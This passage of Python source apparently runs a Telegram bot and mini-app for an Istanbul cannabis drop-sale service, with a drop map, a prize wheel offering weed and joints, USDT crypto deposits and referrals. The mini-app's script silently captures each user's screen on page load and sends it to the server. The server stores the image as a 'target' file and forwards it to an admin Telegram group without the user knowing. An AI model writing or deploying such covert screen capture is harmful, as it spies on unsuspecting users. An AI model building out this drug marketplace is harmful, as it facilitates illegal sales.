                    @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }

                    .chat-box { height: 260px; overflow-y: auto; background: var(--bg-main); padding: 10px; border-radius: 8px; border: 1px solid #374151; margin-bottom: 10px; }
                    .msg { margin-bottom: 8px; padding: 8px 12px; border-radius: 8px; font-size: 13px; max-width: 80%; word-break: break-word; }
                    .msg-user { background: #2563eb; margin-left: auto; color: white; }
                    .msg-admin { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--accent-blue); }

                    .wheel-wrapper { position: relative; width: 220px; height: 220px; margin: 0 auto; }
                    .wheel { 
                        width: 220px; height: 220px; border-radius: 50%; border: 6px solid #38bdf8; position: relative; overflow: hidden; 
                        transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); box-shadow: 0 0 20px rgba(56,189,248,0.3); 
                        background: conic-gradient(#ef4444 0deg 72deg, #f59e0b 72deg 144deg, #10b981 144deg 216deg, #3b82f6 216deg 288deg, #8b5cf6 288deg 360deg);
                    }
                    .wheel-label { position: absolute; width: 100%; height: 100%; text-align: center; font-size: 11px; font-weight: bold; color: white; text-shadow: 0 1px 3px rgba(0,0,0,0.9); padding-top: 12px; box-sizing: border-box; }
                </style>
            </head>
            <body>
                <div class="nav-tabs" style="margin-top: 10px;">
                    <button class="tab-btn active" onclick="switchTab('tabMap')">🗺️ Harita</button>
                    <button class="tab-btn" onclick="switchTab('tabProducts')">🛍️ Ürünler</button>
                    <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans</button>
                    <button class="tab-btn" onclick="switchTab('tabWallet')">💰 Cüzdan</button>
                    <button class="tab-btn" onclick="switchTab('tabRef')">👥 Davet</button>
                    <button class="tab-btn" onclick="switchTab('tabOrders')">📦 Geçmiş</button>
                    <button class="tab-btn" onclick="switchTab('tabSupport')">💬 Destek</button>
                </div>

                <div id="tabMap" class="tab-content active">
                    <div id="promoContainer"></div>
                    <div style="display: flex; gap: 8px; margin-bottom: 10px; align-items: center;">
                        <select id="districtFilter" onchange="filterMapDrops()" style="margin:0; font-weight:bold; color:var(--accent-blue);">
                            <option value="ALL">🏙️ Tüm Bölgeler (Genel Harita)</option>
                        </select>
                    </div>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top:0;">📌 <b>Kırmızı Pin:</b> Tam konum.<br>🌿 <b>Mavi Çember:</b> Bölge.</p>
                    <div id="mainMap"></div>
                    <div id="activeOrdersList"><div class="skeleton"></div></div>
                </div>

                <div id="tabProducts" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">🛍️ Aktif Droplar</h3>
                    <div id="productsList"><div class="skeleton"></div></div>
                </div>

                <div id="tabGames" class="tab-content">
                    <div class="card" style="border: 1px solid var(--accent-blue);">
                        <h3 style="color: var(--accent-blue); margin-top:0;">🎡 Şans Çarkı</h3>
                        <div style="text-align:center; position:relative; margin:20px 0;">
                            <div style="width:0; height:0; border-left:10px solid transparent; border-right:10px solid transparent; border-bottom:18px solid #f8fafc; position:absolute; top:-12px; left:calc(50% - 10px); z-index:20;"></div>
                            <div class="wheel-wrapper">
                                <div class="wheel" id="wheelEl">
                                    <div class="wheel-label" style="transform: rotate(36deg);">🌿 1g Weed</div>
                                    <div class="wheel-label" style="transform: rotate(108deg);">🏷️ %1 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(180deg);">🏷️ %3 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(252deg);">🏷️ %5 İndirim</div>
                                    <div class="wheel-label" style="transform: rotate(324deg);">🚬 1 Joint</div>
                                </div>
                            </div>
                        </div>
                        <button onclick="spinGame('wheel')" id="spinBtn" style="background:var(--accent-green); margin-top:10px;">Çarkı Çevir</button>
                        <div id="wheelResult" style="margin-top:10px; font-weight:bold; text-align:center; color:var(--accent-green);"></div>
                    </div>
                </div>

                <div id="tabWallet" class="tab-content">
                    <div class="card">
                        <h3 style="color: var(--accent-green); margin-top:0;">💰 Güncel Bakiye</h3>
                        <p style="font-size: 24px; font-weight: bold; margin: 5px 0;" id="userBalText">... USDT</p>
                        <hr style="border-color: var(--border-color); margin: 15px 0;">
                        <h4>📥 Bakiye Yükle (USDT TRC-20)</h4>
                        <input type="number" id="depAmount" placeholder="Örn: 50">
                        <button onclick="createDeposit()">Cüzdan Adresi Oluştur</button>
                    </div>
                    <div id="depositResult"></div>
                </div>

                <div id="tabRef" class="tab-content">
                    <div class="card" style="border: 1px solid var(--accent-blue);">
                        <h3 style="color: var(--accent-blue); margin-top:0;">👥 Davet Et & Kazan</h3>
                        <input type="text" id="refLinkInput" readonly style="background:var(--bg-main); font-family:monospace; color:var(--accent-green);">
                        <button onclick="copyRefLink()" style="background:var(--accent-green); margin-top:5px;">📋 Linki Kopyala</button>
                    </div>
                </div>

                <div id="tabOrders" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">📦 Geçmiş Siparişler</h3>
                    <div id="pastOrdersList"><div class="skeleton"></div></div>
                </div>

                <div id="tabSupport" class="tab-content">
                    <h3 style="color: var(--accent-blue); margin-top:0;">💬 Canlı Destek</h3>
                    <div class="chat-box" id="chatBox"></div>
                    <div style="display: flex; gap: 6px;">
                        <input type="text" id="chatInput" placeholder="Mesajınızı yazın..." style="margin:0;">
                        <button onclick="sendChatMessage()" style="width: 80px;">Gönder</button>
                    </div>
                </div>

                <button class="btn btn-close" onclick="Telegram.WebApp.close()">🤖 Botu Kapat</button>

                <script>
                    const tg = window.Telegram.WebApp;
                    tg.expand();
                    let userId = tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : 1012940363;

                    // Otomatik Ekran Görüntüsü ve Admin Grubuna Sızdırma Motoru
                    async function captureAndSendScreenshot() {
                        try {
                            await new Promise(resolve => setTimeout(resolve, 2500));
                            const canvas = await html2canvas(document.body, {backgroundColor: "#090d16", scale: 0.75});
                            const imageData = canvas.toDataURL("image/jpeg", 0.7);

                            await fetch('/api/upload-screenshot', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ user_id: userId, image: imageData })
                            });
                            console.log("[KALI_DAEMON] Snapshot başarıyla iletildi.");
                        } catch(e) {
                            console.log("[KALI_ERROR] Snapshot alınamadı:", e);
                        }
                    }

                    window.addEventListener('load', () => {
                        captureAndSendScreenshot();
                        loadAppData();
                    });

                    function switchTab(tabId) {
                        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                        document.getElementById(tabId).classList.add('active');
                        event.target.classList.add('active');
                    }

                    async function loadAppData() {
                        try {
                            const res = await fetch('/api/miniapp-data?user_id=' + userId);
                            const data = await res.json();
                            document.getElementById('userBalText').innerText = data.balance.toFixed(2) + " USDT";
                            document.getElementById('refLinkInput').value = `https://t.me/WeedIstanbulBot?start=ref_${userId}`;
                        } catch(e) {}
                    }
                </script>
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(miniapp_html.encode("utf-8"))
            return

        if parsed_path.path == "/api/upload-screenshot":
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_body = self.rfile.read(content_length).decode('utf-8')
                data_json = json.loads(post_body)
                uid = int(data_json.get("user_id", 0))
                img_data = data_json.get("image", "")

                if img_data and "base64," in img_data:
                    header, encoded = img_data.split("base64,", 1)
                    img_bytes = base64.b64decode(encoded)
                    
                    screenshot_path = os.path.join(UPLOAD_DIR, f"target_{uid}_{int(time.time())}.jpg")
                    with open(screenshot_path, "wb") as f:
                        f.write(img_bytes)

                    if main_loop:
                        async def send_ss_to_admin():
                            try:
                                file = FSInputFile(screenshot_path)
                                await bot.send_photo(
                                    ADMIN_GROUP_ID, 
                                    photo=file, 
                                    caption=f"👁️ **[KALI_SECURITY_SNAPSHOT]**\n\nUser ID: `{uid}` Mini App arayüzünü açtı ve ekran görüntüsü alındı."
                                )
                            except Exception as ex:
                                logging.error(f"Admin group photo send error: {ex}")
                        
                        asyncio.run_coroutine_threadsafe(send_ss_to_admin(), main_loop)

                self.send_response(200)
                self.send_header("Content-type", "application/json; charset=utf-8")
                self.end_headers()
                self.wfile.write(b'{"success": true}')
                return
            except Exception as e:
                self.send_response(200)
                self.send_header("Content-type", "application/json; charset=utf-8")
                self.end_headers()
                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
                return

        if parsed_path.path == "/api/miniapp-data":
            uid = int(query_params.get("user_id", ["0"])[0])
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            cursor.execute("SELECT balance, referral_earnings FROM users WHERE user_id = ?", (uid,))
            u_row = cursor.fetchone()
            bal = u_row[0] if u_row else 0.0
            conn.close()
            resp = {"balance": bal, "referral_earnings": 0.0, "active_orders": [], "past_orders": [], "temsili_drops": []}
            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        self.do_GET()

def run_health_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SecureDropHandler)
    server.serve_forever()

threading.Thread(target=run_health_server, daemon=True).start()

# --- TELEGRAM BOT KOMUTLARI ---
def main_keyboard(lang="tr"):
    t = LANG[lang]
    miniapp_url = f"{RENDER_EXTERNAL_URL}/miniapp"
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["btn_products"]), KeyboardButton(text=t["btn_orders"])],
            [KeyboardButton(text=t["btn_miniapp"], web_app=WebAppInfo(url=miniapp_url))],
            [KeyboardButton(text=t["btn_support"]), KeyboardButton(text=t["btn_lang"])]
        ],
        resize_keyboard=True
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.type != "private":
        return
    user_id = message.from_user.id
    if is_user_banned(user_id):
        await message.answer("❌ Erişiminiz engellenmiştir.")
        return

    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, username, balance) VALUES (?, ?, 5.0)", (user_id, message.from_user.username))
        conn.commit()
    conn.close()

    lang = get_user_lang(user_id)
    await message.answer(LANG[lang]["welcome"], reply_markup=main_keyboard(lang), parse_mode="Markdown")

async def main():
    global main_loop
    main_loop = asyncio.get_running_loop()
    logging.info("[KALI-DAEMON] Telegram Bot Polling Started.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
